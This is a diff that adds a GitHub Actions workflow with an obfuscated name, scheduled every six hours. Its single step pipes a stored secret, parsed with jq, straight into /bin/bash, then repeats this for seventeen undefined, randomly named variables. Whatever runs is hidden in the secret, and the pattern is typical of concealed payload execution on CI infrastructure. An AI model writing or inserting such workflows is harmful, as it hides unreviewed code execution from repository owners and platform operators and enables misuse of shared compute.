@@ -1,0 +1,36 @@
+name: quankuandemaifangg
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: quankuandemaifangg
+        env:
+          es015: ${{ secrets.es015 }}
+        run: |
+          echo $es015 | jq -r .nzz61735 | /bin/bash
+          echo $zqaof2811 | jq -r .acqa2 | /bin/bash
+          echo $oc571 | jq -r .hhx2 | /bin/bash
+          echo $xwju34 | jq -r .f46 | /bin/bash
+          echo $kiun668 | jq -r .nhaxt6053 | /bin/bash
+          echo $jtcvm6 | jq -r .dqnh66 | /bin/bash
+          echo $h62394 | jq -r .bleb56754 | /bin/bash
+          echo $uost0 | jq -r .pfsf2249 | /bin/bash
+          echo $ebpf8649 | jq -r .qb80586 | /bin/bash
+          echo $jc1 | jq -r .zal8722 | /bin/bash
+          echo $ee6 | jq -r .t93 | /bin/bash
+          echo $guzz7 | jq -r .i6 | /bin/bash
+          echo $ephng66216 | jq -r .cwien08 | /bin/bash
+          echo $kdg07 | jq -r .s827 | /bin/bash
+          echo $fulmo2 | jq -r .a56119 | /bin/bash
+          echo $hmvy442 | jq -r .ohlwm74 | /bin/bash
+          echo $mkg81967 | jq -r .c45 | /bin/bash
+          echo $hl6763 | jq -r .hcbs72 | /bin/bash
+
